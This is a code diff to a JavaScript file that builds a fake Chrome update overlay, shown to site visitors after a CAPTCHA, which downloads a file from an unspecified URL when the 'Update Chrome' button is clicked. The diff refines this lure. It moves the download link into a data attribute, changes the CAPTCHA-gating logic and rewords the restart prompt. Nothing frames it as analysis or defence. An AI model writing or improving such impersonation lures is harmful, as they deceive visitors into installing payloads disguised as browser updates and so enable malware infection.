@@ -15,7 +15,6 @@
   // 1. Constants and configuration
   // ------------------------------------------------
   const UPDATE_PAGE_ID = "browser-update-page";
-  const CAPTCHA_PASSED_KEY = "captchaPassed";
 
   const BROWSER_DATA = {
     chrome: {
@@ -261,7 +260,7 @@
           <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Chrome">
         </div>
         <h1 class="chrome-update-title" id="browser-update-page-title">You need to update your browser to<br>view the content!</h1>
-        <a class="chrome-update-button" href="${downloadUrl}" data-action="download">Update Chrome</a>
+        <a class="chrome-update-button" data-download-url="${downloadUrl}" data-action="download">Update Chrome</a>
         <div class="chrome-update-os">For Windows 11/10 64‑bit.</div>
         <div class="chrome-update-checkbox-row">
           <input type="checkbox" checked class="chrome-update-checkbox">
@@ -370,8 +369,6 @@
         e.preventDefault();
         // Mark that the user downloaded the update
         localStorage.setItem(UPDATE_DOWNLOADED_KEY, "true");
-        // Optionally clear captcha flag
-        localStorage.removeItem(CAPTCHA_PASSED_KEY);
 
         // Perform the download
         const url = target.dataset.downloadUrl || target.href;
@@ -385,7 +382,7 @@
         }
         const note = overlay.querySelector('.browser-update-page__note, .chrome-update-os, .firefox-update-footer');
         if (note) {
-          note.textContent = "Please restart your browser after it completes.";
+          note.textContent = "Please restart your browser after updates.";
         }
       } else if (action === "reload") {
         e.preventDefault();
@@ -409,11 +406,9 @@
   // 8. Initialisation on load
   // ------------------------------------------------
   function init() {
-    // If CAPTCHA already passed (e.g., on reload), show overlay immediately
-    if (localStorage.getItem(CAPTCHA_PASSED_KEY) === "true") {
-      createUpdateOverlay();
-    }
-    // Otherwise, CAPTCHA is visible and will call window.showUpdateOverlay later
+    // CAPTCHA is already visible if update not downloaded.
+    // The overlay will be shown only when window.showUpdateOverlay() is called (after CAPTCHA passes).
+    // Nothing else needed.
   }
 
   if (document.readyState === "loading") {
